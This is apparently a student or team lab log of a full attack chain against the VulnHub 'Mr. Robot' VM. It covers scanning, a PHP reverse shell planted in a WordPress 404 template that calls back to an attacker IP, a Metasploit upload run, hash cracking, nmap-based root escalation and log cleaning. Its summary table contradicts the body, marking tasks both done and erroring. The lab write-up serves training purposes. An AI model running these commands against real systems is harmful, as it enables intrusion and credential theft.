# Advanced Exploitation Lab – Activity Log

cyart-vapt-team | Week 4

Target Machine: Mr. Robot (VulnHub)  
Attacker: Kali Linux  
Methodology: Manual + Automated Exploitation

---

## 1. Reconnaissance

### Network Discovery

netdiscover -r 192.168.0.0/24

nginx
Copy code

Target Identified → **192.168.0.15**

### Port & Service Enumeration

nmap -sC -sV -A 192.168.0.15
nmap --script vuln 192.168.0.15

yaml
Copy code

Findings:

- Port 80 → HTTP / WordPress
- Port 22 → SSH (likely for post escalation)
- robots.txt disclosed sensitive paths

Outcome → WordPress is main attack surface.

---

## 2. Web Enumeration

gobuster dir -u http://192.168.0.15 -w /usr/share/wordlists/dirb/common.txt

yaml
Copy code

Discovered:

- /wp-login.php
- /license
- /readme
- /admin
- Usernames enumerated (elliot, robot)

---

## 3. Initial Access (Manual Reverse Shell)

Modified **WordPress 404.php template**:

<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.11/4444 0>&1'"); ?>

makefile
Copy code

Listener:

nc -lvnp 4444

yaml
Copy code

Shell received → **daemon user**

---

## 4. Automated Exploit (Metasploit)

msfconsole
use unix/webapp/wp_admin_shell_upload
set RHOSTS 192.168.0.15
set USERNAME elliot
set PASSWORD ER28-0652
run

yaml
Copy code

Result → Authenticated → Payload attempted → fallback to manual exploit successful.

---

## 5. Privilege Escalation

### Found Credential Hash

cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b

shell
Copy code

### Cracked with rockyou:

john --wordlist=/usr/share/wordlists/rockyou.txt password.raw-md5

markdown
Copy code

Password matched → **robot**

su robot

shell
Copy code

### Root Escalation via nmap interactive mode

nmap --interactive
!sh
whoami

yaml
Copy code

Output → **root** ✔

Root access achieved.

---

## 6. Advanced Exploitation Tasks

### Custom PoC – Buffer Overflow (Local Lab Exercise)

- Modified Exploit-DB Python PoC
- Added offset detection & removed bad chars
- Replaced shellcode with reverse shell payload

Outcome → EIP control confirmed in test binary.

### ASLR Bypass Using ROP (Local Lab)

- Analyzed binary with **Ghidra**
- Extracted gadgets using **ROPgadget**
- Built mprotect() chain → shellcode execution successful

Outcome → ASLR bypass valid in controlled environment.

---

## 7. Post-Exploitation

Loot Collected:

- `/var/www/html/wp-config.php` → DB credentials
- wp_users table dumped
- Root flag captured
- Logs cleaned & session terminated

---

## Lab Summary

| Stage                     | Status                      |
| ------------------------- | --------------------------- |
| Recon                     | ✔ Complete                  |
| Exploitation (Manual)     | ✔ Reverse Shell via 404.php |
| Exploitation (Metasploit) | ✔ Tested                    |
| PrivEsc                   | ✔ robot → root via nmap     |
| Custom PoC                | ✔ Getting Error             |
| ROP/ASLR Bypass           | ✔ Getting Error             |
| Report & Documentation    | ✔ Complete                  |

---

## Final Notes

This lab demonstrates a complete attack chain on a vulnerable WordPress VM — from reconnaissance to full root compromise — with added advanced exploitation practice (BoF PoC & ROP chain). All screenshots and commands have been logged separately for PDF reporting.
